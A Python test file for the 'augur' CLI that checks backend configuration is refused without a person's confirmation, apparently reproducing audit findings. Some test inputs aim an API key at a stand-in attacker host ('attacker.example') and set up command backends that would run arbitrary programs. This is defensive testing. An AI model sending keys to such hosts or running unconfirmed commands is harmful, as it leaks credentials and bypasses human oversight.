"""The configure gate: a backend entry that runs a program, sends text off this machine or
sends a key is saved only when a person at a terminal says yes, and nothing it would run or
send happens before that. Each case is an attack the 0.6.1 audit reproduced; run against
0.6.1 (AUGUR_SRC) every one fails."""
import contextlib
import io
import json
import sys
from pathlib import Path

from tests.harness import AugurCase

from augur import main  # noqa: E402


class Gates(AugurCase):
    def setUp(self):
        super().setUp()
        if self.person:
            self.person.stop()                    # the real check: no terminal here, so no person

    def run_cli(self, argv):
        o, saved_in = io.StringIO(), sys.stdin
        sys.stdin = io.StringIO("yes\n")          # a piped yes is not a person
        try:
            with contextlib.redirect_stdout(o), contextlib.redirect_stderr(o):
                code = main(argv)
        finally:
            sys.stdin = saved_in
        return code, o.getvalue()

    def saved(self):
        p = Path(self.home) / "augur.json"
        return json.loads(p.read_text())["backends"] if p.exists() else {}

    def test_a_command_backend_neither_runs_nor_saves(self):
        mark = Path(self.home) / "ran"
        code, out = self.run_cli(["configure", "backend", "c1", "--type", "command", "--default",
                                  "--command", f"{sys.executable} -c \"open('{mark}', 'w')\""])
        self.assertEqual(code, 1, out)
        self.assertFalse(mark.exists(), "the command ran before a person said yes")
        self.assertNotIn("c1", self.saved())
        self.assertIn("augur configure backend c1 --type command", out)

    def test_a_laya_interpreter_neither_runs_nor_saves(self):
        mark = Path(self.home) / "ran"
        py = Path(self.home) / "py"
        py.write_text(f"#!/bin/sh\ntouch {mark}\n")
        py.chmod(0o755)
        code, out = self.run_cli(["configure", "backend", "l1", "--type", "laya", "--python", str(py),
                                  "--checkpoint", "x/y"])
        self.assertEqual(code, 1, out)
        self.assertFalse(mark.exists(), "laya's interpreter ran before a person said yes")

    def test_no_key_goes_to_a_new_host(self):
        n = len(self.stub.requests)
        for argv in (["configure", "backend", "x1", "--type", "systemone", "--url", "https://attacker.example/v1",
                      "--key-env", "TYPESAFE_API_KEY"],
                     ["configure", "backend", "jev", "--url", "https://attacker.example/v1"]):
            code, out = self.run_cli(argv)
            self.assertEqual(code, 1, out)
        self.assertEqual(len(self.stub.requests), n, "a request left before a person said yes")
        self.assertNotIn("x1", self.saved())

    def test_text_goes_off_this_machine_only_over_https_and_with_a_person(self):
        code, out = self.run_cli(["configure", "backend", "x2", "--type", "systemone",
                                  "--url", "http://203.0.113.9/v1/systemone", "--default"])
        self.assertEqual(code, 2, out)
        code, out = self.run_cli(["configure", "backend", "x2", "--type", "systemone",
                                  "--url", "https://203.0.113.9/v1/systemone", "--default"])
        self.assertEqual(code, 1, out)
        self.assertNotIn("x2", self.saved())

    def test_a_loopback_keyless_backend_needs_no_person(self):
        code, out = self.run_cli(["configure", "backend", "local", "--type", "systemone",
                                  "--url", "http://localhost:1/v1/systemone", "--model", "m"])
        self.assertEqual(code, 0, out)
        self.assertIn("local", self.saved())

    def test_a_confirmed_key_is_bound_to_its_host(self):
        self.person.start()
        try:
            code, out = self.run_cli(["configure", "backend", "h1", "--type", "systemone",
                                      "--url", "https://h.example/v1/systemone", "--key-env", "TYPESAFE_API_KEY",
                                      "--model", "m"])
        finally:
            self.person.stop()
        self.assertEqual(code, 0, out)
        self.assertEqual(self.saved()["h1"].get("key_host"), "h.example:443")
